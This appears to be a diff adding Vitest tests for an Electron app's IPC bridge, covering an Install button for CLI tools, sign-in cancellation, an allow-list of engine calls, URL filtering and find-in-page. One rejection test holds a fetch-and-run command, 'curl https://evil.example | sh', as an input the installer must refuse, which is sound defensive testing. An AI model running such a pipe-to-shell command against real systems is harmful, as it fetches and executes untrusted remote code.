@@ -286,3 +286,163 @@ describe('the setup log', () => {
     }
   })
 })
+
+describe('the Install button', () => {
+  function installer(order: string[] = []) {
+    return {
+      run: vi.fn(async (kinds: ('claude' | 'codex')[]) => {
+        order.push(`run ${kinds.join(',')}`)
+        return { outcome: 'done' as const }
+      }),
+      cancel: vi.fn(async () => {
+        await new Promise((resolve) => setTimeout(resolve, 5))
+        order.push('cancelled')
+        return true
+      }),
+      openSignInPage: vi.fn(async () => true)
+    }
+  }
+
+  test('with the switch off, the install calls aren’t there at all, and the button reads off', () => {
+    wired()
+    for (const channel of ['tearsheet:install', 'tearsheet:cancelInstall', 'tearsheet:openSignInPage']) expect(handlers.has(channel)).toBe(false)
+    expect(handlers.get('tearsheet:getInstallButton')!()).toBe(false)
+  })
+
+  test('getInstallButton answers what the online off switch says, with or without the installer', () => {
+    let on = true
+    wired({ installButton: () => on })
+    expect(handlers.get('tearsheet:getInstallButton')!()).toBe(true)
+    on = false
+    expect(handlers.get('tearsheet:getInstallButton')!()).toBe(false)
+  })
+
+  test('install runs the tools the window names, and nothing else', async () => {
+    const fake = installer()
+    wired({ installer: fake })
+    const install = handlers.get('tearsheet:install')!
+    expect(await install({}, ['claude', 'codex'])).toEqual({ outcome: 'done' })
+    expect(fake.run).toHaveBeenCalledWith(['claude', 'codex'])
+    for (const bad of ['claude', ['curl https://evil.example | sh'], [{ command: 'x' }], undefined, []]) {
+      expect(await install({}, bad)).toEqual({ outcome: 'refused' })
+    }
+    expect(fake.run).toHaveBeenCalledTimes(1)
+  })
+
+  test('cancelInstall stops the sign-in; openSignInPage takes no link from the window', async () => {
+    const fake = installer()
+    wired({ installer: fake })
+    expect(await handlers.get('tearsheet:cancelInstall')!({})).toBe(true)
+    expect(fake.cancel).toHaveBeenCalledTimes(1)
+    expect(await handlers.get('tearsheet:openSignInPage')!({}, 'https://evil.example/')).toBe(true)
+    expect(fake.openSignInPage).toHaveBeenCalledWith()
+  })
+
+  test('copying the paste command stops a sign-in under way first', async () => {
+    const order: string[] = []
+    const fake = installer(order)
+    const { copied } = wired({
+      installer: fake,
+      copyAndOpen: async (command) => {
+        order.push('copied')
+        copied.push(command)
+        return { copied: true, opened: true }
+      }
+    })
+    expect(await handlers.get('tearsheet:copyAndOpenTerminal')!({}, ['claude'])).toEqual({ copied: true, opened: true })
+    expect(order).toEqual(['cancelled', 'copied'])
+  })
+
+  test('the old Open Terminal call is gone', () => {
+    wired({ installer: installer() })
+    expect(handlers.has('tearsheet:openTerminal')).toBe(false)
+  })
+})
+
+describe('the rest of the bridge', () => {
+  test('a call the list doesn’t have never reaches the engine', async () => {
+    const request = vi.fn(async () => ({}))
+    wired({ request })
+    expect(await handlers.get('tearsheet:call')!({}, 'shutdown', {})).toEqual({ ok: false, error: { message: 'Unknown call shutdown.' } })
+    expect(request).not.toHaveBeenCalled()
+  })
+
+  test('a call goes to its engine method, with empty params when none are given, and a run’s id is kept', async () => {
+    const request = vi.fn(async (method: string) => (method === 'run_report' || method === 'resume' ? { run_id: `${method}-1` } : { fine: true }))
+    const { engine } = wired({ request })
+    const call = handlers.get('tearsheet:call')!
+    expect(await call({}, 'getSettings', undefined)).toEqual({ ok: true, result: { fine: true } })
+    expect(request).toHaveBeenLastCalledWith('get_settings', {})
+    await call({}, 'runReport', { query: 'AAPL' })
+    expect((engine as unknown as { lastRunId: string }).lastRunId).toBe('run_report-1')
+    await call({}, 'resume', { run_id: 'x' })
+    expect((engine as unknown as { lastRunId: string }).lastRunId).toBe('resume-1')
+  })
+
+  test('engine errors come back with their code and data; other errors with their message', async () => {
+    let fail: Error = new EngineError('No such report.', 1, { code: 'NOT_FOUND', report_id: 'r' })
+    const { entries } = wired({
+      request: async () => {
+        throw fail
+      }
+    })
+    const call = handlers.get('tearsheet:call')!
+    expect(await call({}, 'getReport', {})).toEqual({ ok: false, error: { message: 'No such report.', code: 'NOT_FOUND', data: { code: 'NOT_FOUND', report_id: 'r' } } })
+    fail = new EngineError('The key was refused.', 1, {})
+    await call({}, 'checkKey', {})
+    expect(entries).toEqual([['key_check', { code: 'error' }]])
+    fail = new Error('The engine stopped.')
+    expect(await call({}, 'getReport', {})).toEqual({ ok: false, error: { message: 'The engine stopped.' } })
+  })
+
+  test('openExternal opens only the allowed pages', async () => {
+    wired()
+    opened.length = 0
+    const open = handlers.get('tearsheet:openExternal')!
+    expect(await open({}, 'https://massive.com/dashboard')).toBe(true)
+    for (const bad of ['https://evil.example/', 'https://nodejs.org', 'https://claude.com/cai/oauth/authorize', 42]) expect(await open({}, bad)).toBe(false)
+    expect(opened).toEqual(['https://massive.com/dashboard'])
+  })
+
+  test('a find answers once its last result arrives, and stopping or a new page ends the session', async () => {
+    const { contents } = wired()
+    const find = handlers.get('tearsheet:find')!
+    expect(find({}, '', true)).toBeUndefined()
+    const done = find({}, 'Hold', true) as Promise<void>
+    expect(contents.findInPage).toHaveBeenLastCalledWith('Hold', { forward: true, findNext: true })
+    contents.emit('found-in-page', {}, { requestId: 2, finalUpdate: true })
+    contents.emit('found-in-page', {}, { requestId: 1, finalUpdate: false })
+    contents.emit('found-in-page', {}, { requestId: 1, finalUpdate: true })
+    await expect(done).resolves.toBeUndefined()
+    expect(contents.listenerCount('found-in-page')).toBe(0)
+    // The same query again steps through it.
+    void find({}, 'Hold', true)
+    expect(contents.findInPage).toHaveBeenLastCalledWith('Hold', { forward: true, findNext: false })
+    handlers.get('tearsheet:stopFind')!()
+    expect(contents.stopFindInPage).toHaveBeenCalledWith('clearSelection')
+    void find({}, 'Hold', true)
+    expect(contents.findInPage).toHaveBeenLastCalledWith('Hold', { forward: true, findNext: true })
+    contents.emit('did-frame-navigate')
+    void find({}, 'Hold', false)
+    expect(contents.findInPage).toHaveBeenLastCalledWith('Hold', { forward: false, findNext: true })
+  })
+
+  test('an engine that failed before the page loaded is told again once it has', () => {
+    const { engine, contents } = wired()
+    contents.emit('did-finish-load')
+    expect(contents.send).not.toHaveBeenCalled()
+    ;(engine as unknown as { fatalMessage: string }).fatalMessage = 'The engine couldn’t start.'
+    contents.emit('did-finish-load')
+    expect(contents.send).toHaveBeenCalledWith('tearsheet:notification', { method: 'engine_fatal', params: { message: 'The engine couldn’t start.' } })
+  })
+
+  test('with nothing optional given: no log, empty About, and the real copy (whose clipboard here reads back nothing)', async () => {
+    const { window } = openWindow()
+    const engine = Object.assign(new EventEmitter(), { fatalMessage: null, request: async () => ({}) }) as unknown as Engine
+    registerIpc(window, engine, { watch: new ToolWatch({ probe: async () => tools }), rules: { noRealInstallers: false, home: '/Users/you' } })
+    expect(handlers.get('tearsheet:about')!()).toEqual({ app: '', engine: null, macos: '', electron: '' })
+    expect(await handlers.get('tearsheet:copyAndOpenTerminal')!({}, ['claude'])).toEqual({ copied: false, opened: false })
+    expect(await handlers.get('tearsheet:call')!({}, 'checkKey', {})).toEqual({ ok: true, result: {} })
+    expect(handlers.get('tearsheet:showSetupLog')!()).toBe(false)
+  })
+})
